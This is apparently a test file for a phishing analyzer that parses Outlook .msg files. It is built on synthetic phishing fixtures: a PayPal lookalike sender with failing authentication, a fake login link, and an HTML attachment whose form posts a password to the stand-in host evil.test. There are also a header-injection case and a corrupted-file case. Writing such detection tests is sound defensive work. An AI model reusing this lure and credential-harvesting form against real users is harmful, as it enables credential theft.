import { describe, expect, it } from "vitest";
import { analyzeEmail, EmailParseError } from "../src/index.ts";
import { isOutlookMsg, msgToEml } from "../src/msg.ts";
import { bytes, compoundFile, fixedProps, prop, unicode, type Node } from "./compound-file.ts";

const PHISH_HEADERS = [
  "Received: from vps-77.hosting.test (vps-77.hosting.test [198.51.100.77]) by mx.inbox.example with ESMTP id 1; Mon, 19 Oct 2026 10:00:00 +0000",
  "Authentication-Results: mx.inbox.example; spf=softfail smtp.mailfrom=paypa1-security.test; dkim=none; dmarc=fail header.from=paypa1-security.test",
  'From: "PayPal" <service@paypa1-security.test>',
  "To: alex@inbox.example",
  "Subject: Your account is limited",
  "Date: Mon, 19 Oct 2026 10:00:00 +0000",
  "MIME-Version: 1.0",
  'Content-Type: multipart/alternative; boundary="original"',
  "",
  "",
].join("\r\n");

const phishProps = (): Node[] => [
  fixedProps(32),
  prop("007D001F", unicode(PHISH_HEADERS)),
  prop("0037001F", unicode("Your account is limited")),
  prop("1000001F", unicode("Verify your account within 24 hours.")),
  prop("10130102", bytes('<p>Verify your account within 24 hours.</p><p><a href="http://paypa1-security.test/login">Log in to PayPal</a></p>')),
  {
    name: "__attach_version1.0_#00000000",
    children: [
      fixedProps(8),
      prop("3707001F", unicode("invoice.html")),
      prop("370E001F", unicode("text/html")),
      // Over 4096 bytes, so it's stored in regular sectors rather than the mini stream.
      prop("37010102", bytes(`<html><form action="https://evil.test/p"><input type="password"></form>${" ".repeat(5000)}</html>`)),
    ],
  },
];

describe("Outlook .msg files", () => {
  it("reads one like the email inside it: headers, HTML, links and attachments", async () => {
    const file = compoundFile(phishProps());
    expect(isOutlookMsg(file)).toBe(true);
    const analysis = await analyzeEmail(file);
    expect(analysis.sender?.address).toBe("service@paypa1-security.test");
    expect(analysis.verdict).toBe("phishing");
    const rules = analysis.findings.map((f) => f.rule);
    expect(rules).toEqual(expect.arrayContaining(["sender-disguise", "auth-dmarc-fail", "attachment-webpage"]));
    expect(rules.some((r) => r.startsWith("link-"))).toBe(true);
    expect(analysis.attachments.map((a) => a.filename)).toEqual(["invoice.html"]);
  });

  it("rebuilds the sender from properties when there are no transport headers", async () => {
    const file = compoundFile([
      fixedProps(32),
      prop("0C1A001F", unicode("IT Help Desk")),
      prop("5D01001F", unicode("helpdesk-notice@freemail.test")),
      prop("0037001F", unicode("Password expires today")),
      prop("1000001F", unicode("Your password expires today. Verify your account now.")),
    ]);
    const analysis = await analyzeEmail(file);
    expect(analysis.sender).toEqual({ name: "IT Help Desk", address: "helpdesk-notice@freemail.test" });
    expect(analysis.subject).toBe("Password expires today");
  });

  it("judges the original inside an Outlook forward-as-attachment", async () => {
    const forward = [
      "Received: from out.inbox.example (out.inbox.example [192.0.2.80]) by mx.inbox.example with ESMTPS id 2; Tue, 20 Oct 2026 09:00:00 +0000",
      "Authentication-Results: mx.inbox.example; spf=pass smtp.mailfrom=inbox.example; dkim=pass header.d=inbox.example; dmarc=pass header.from=inbox.example",
      "From: Alex Chen <alex@inbox.example>",
      "To: it@inbox.example",
      "Subject: FW: Your account is limited",
      "",
      "",
    ].join("\r\n");
    const file = compoundFile([
      fixedProps(32),
      prop("007D001F", unicode(forward)),
      prop("1000001F", unicode("Is this real?")),
      {
        name: "__attach_version1.0_#00000000",
        children: [fixedProps(8), prop("3707001F", unicode("Your account is limited")), { name: "__substg1.0_3701000D", children: [fixedProps(24), ...phishProps().slice(1)] }],
      },
    ]);
    const analysis = await analyzeEmail(file);
    expect(analysis.forwarded?.mode).toBe("attachment");
    expect(analysis.sender?.address).toBe("service@paypa1-security.test");
    expect(analysis.verdict).toBe("phishing");
  });

  it("gives up cleanly on a broken or looping file", async () => {
    const file = compoundFile(phishProps());
    // Point the directory's first sector back at itself in the FAT: a chain that never ends.
    const view = new DataView(file.buffer);
    const directory = view.getUint32(0x30, true);
    view.setUint32(512 + directory * 4, directory, true);
    expect(msgToEml(file)).toBeNull();
    await expect(analyzeEmail(file)).rejects.toBeInstanceOf(EmailParseError);
    // A file that only starts like one.
    await expect(analyzeEmail(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0]))).rejects.toBeInstanceOf(EmailParseError);
  });

  it("strips anything in the stored headers that isn't a header line", () => {
    const sneaky = PHISH_HEADERS.replace("To: alex@inbox.example", "To: alex@inbox.example\r\n--phish-check-mixed-0\r\nX-Injected: yes");
    const eml = msgToEml(compoundFile([fixedProps(32), prop("007D001F", unicode(sneaky)), prop("1000001F", unicode("Hi"))]))!;
    const headers = eml.slice(0, eml.indexOf("\r\n\r\n"));
    expect(headers).not.toContain("--phish-check-mixed-0");
    expect(headers).toContain("X-Injected: yes");
  });
});
